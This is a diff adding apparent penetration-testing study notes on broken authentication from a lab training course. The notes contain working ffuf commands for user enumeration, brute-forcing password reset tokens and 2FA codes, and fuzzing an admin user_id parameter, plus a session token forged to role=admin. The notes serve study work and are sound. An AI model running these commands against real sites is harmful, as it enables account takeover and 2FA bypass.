@@ -1768,3 +1768,106 @@ description:
 >- Must include at least one lowercase letter: `grep -E '[a-z]'`
 >- Must include at least one number: `grep -E '[0-9]'`
 >- Must include at least two special chars (set given): `grep -E '([!@#$%^&*].*){2,}'`
+### Broken Authentication
+
+>[!code]- Enumerating users
+>>[!info]- Information
+>>Possible when a web app responds differently to registered/valid and invalid inputs for authentication endpoints.
+>>
+>>![[Images/Pasted image 20250725062941.png]]
+>>![[Images/Pasted image 20250725062953.png]]
+>
+>```powershell
+>ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
+>```
+>Valid usernames can be garnered through indirect information, such as the response times.
+
+>[!code]- [[Training Material/Web Apps#Login Brute Forcing|Login brute forcing]]
+
+>[!code]- Brute forcing password reset codes
+>>[!info]- Information
+>>
+>>![[Images/Pasted image 20250725065706.png]]
+>
+>Imagine we create a new account on a web app and asked to reset our password. We receive this email:
+>```
+>Hello,
+>
+>We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:
+>
+>1. Click on the following link to reset your password: Click
+>
+>2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351
+>
+>Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.
+>
+>Thank you.
+>```
+>
+>The reset token is accessible via a GET request and is only 4 digits long, meaning a total of 10,000 possible tokens at any one time. We could brute force these tokens at any one time to see whether we can find an active one.
+>
+>```powershell
+># Generate a list of numbers from 0 to 9999 (-w pads the numbers to all be same length)
+>seq -w 0 9999 > tokens.txt
+>
+>ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
+>```
+
+>[!code]- Brute forcing 2FA codes
+>>[!info]- Information
+>>Upon logging in, we are presented with a 2FA code field to pass:
+>>
+>>![[Images/Pasted image 20250725071929.png]]
+>>
+>```powershell
+>ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
+>```
+
+>[!code]- Default credentials
+>- [CIRT.net](https://www.cirt.net/passwords) (a list of default credentials)
+>- [SecList default passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)list
+>- A Google search ("_webapp-name_ default credentials")
+
+>[!code]- Resources through parameter values
+>If a web app provides a protected resource only to authenticated users through a parameter, for example:
+>
+>```powershell
+>http://83.136.255.102:58636/admin.php?user_id=372 # allowed (shows admin page)
+>http://83.136.255.102:58636/admin.php?user_id=183 # disallowed (shows standard user page)
+>```
+>
+>We can fuzz for the 372 parameter:
+>
+>```powershell
+># Must be authenticated (at least as a standard user) hence the PHPSESSID cookie
+>ffuf -u 'http://83.136.255.102:58636/admin.php?user_id=FUZZ' -b 'PHPSESSID=e9j0kl81ouabsh5uh5gh6g5v50' -w ~/learning/htb-broken-authentication/seq-0-9999-no-pad.txt -fr 'Could not load admin data.'
+>```
+
+>[!code]- Session tokens
+>>[!info]- Information
+>>Session tokens are unique identifiers a web application uses to identify a user. The session token is tied to the user's session. If an attacker can obtain a valid session token of another user, the attack can impersonate the user to the web application, thus taking over their session.
+>
+>###### Tokens with insufficient entropy/randomness
+>Session tokens may not be as random as first appears:
+>```powershell
+># Scenario 1 (only changing a small part)
+>2c0c58b27c71a2ec5bf2b4b6e892b9f9
+>2c0c58b27c71a2ec5bf2b4546092b9f9
+>2c0c58b27c71a2ec5bf2b497f592b9f9
+>2c0c58b27c71a2ec5bf2b48bcf92b9f9
+>2c0c58b27c71a2ec5bf2b4735e92b9f9
+>
+># Scenario 2 (incrementing numerically)
+>141233
+>141234
+>141237
+>141238
+>141240
+>
+># Scenario 3 (base64-encoded or hex-encoded)
+>echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
+>user=htb-stdnt;role=user
+>
+>echo -n 'user=htb-stdnt;role=admin' | xxd -p
+>757365723d6874622d7374646e743b726f6c653d61646d696e
+>```
